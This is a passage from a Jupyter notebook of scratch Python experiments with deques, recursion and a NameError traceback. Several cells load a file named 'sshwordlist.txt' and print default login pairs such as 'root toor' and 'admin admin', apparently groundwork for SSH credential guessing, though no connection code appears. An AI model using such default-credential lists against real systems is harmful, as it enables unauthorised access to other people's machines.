      "\u001b[0;32m/tmp/ipykernel_6231/1659360486.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0;32mif\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0md\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      2\u001b[0m     \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"hi\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m     \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"du\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mNameError\u001b[0m: name 'd' is not defined"
     ]
    }
   ],
   "source": [
    "if not d:\n",
    "    print(\"hi\")\n",
    "else:\n",
    "    print(\"du\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "deque([1])"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [],
   "source": [
    "def rec():\n",
    "    try:\n",
    "        global l\n",
    "        print(l)\n",
    "        return\n",
    "    except NameError:\n",
    "        l = 1\n",
    "        rec()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1\n"
     ]
    }
   ],
   "source": [
    "rec()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [],
   "source": [
    "l = 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1\n"
     ]
    }
   ],
   "source": [
    "print(l)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "q = deque()\n",
    "for i in open(\"sshwordlist.txt\").readlines():\n",
    "    q.append(i)\n",
    "    #[username, password] = s[i].strip().split()\n",
    "    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [],
   "source": [
    "from collections import deque"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "deque(['admin password\\n',\n",
       "       'root toor\\n',\n",
       "       'admin admin\\n',\n",
       "       'server admin\\n',\n",
       "       'sinus cosinus\\n',\n",
       "       'tangens riebert\\n',\n",
       "       'supp woritz\\n',\n",
       "       'win noch\\n',\n",
       "       'wier und\\n',\n",
       "       'wolle wunktion\\n',\n",
       "       'root root\\n'])"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "q"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0 11\n",
      "admin password\n",
      "\n",
      "1 10\n",
      "root toor\n",
      "\n",
      "2 9\n",
      "admin admin\n",
      "\n",
      "3 8\n",
      "server admin\n",
      "\n",
      "4 7\n",
      "sinus cosinus\n",
      "\n",
      "5 6\n",
      "tangens riebert\n",
      "\n",
      "6 5\n",
      "supp woritz\n",
      "\n",
      "7 4\n",
      "win noch\n",
      "\n",
      "8 3\n",
      "wier und\n",
      "\n",
      "9 2\n",
      "wolle wunktion\n",
      "\n",
      "10 1\n",
      "root root\n",
      "\n"
     ]
    }
   ],
   "source": [
    "for i in range(len(q)):\n",
    "        j = len(q)\n",
    "        for k in range(j):\n",
    "            print(k,len(q))\n",
    "            #print(q)\n",
    "            print(q[i])\n",
    "            q.popleft()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "deque(['admin password\\n', 'root toor\\n', 'admin admin\\n', 'root root\\n'])"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "from queue import Queue"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "q = Queue(maxsize = len())"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
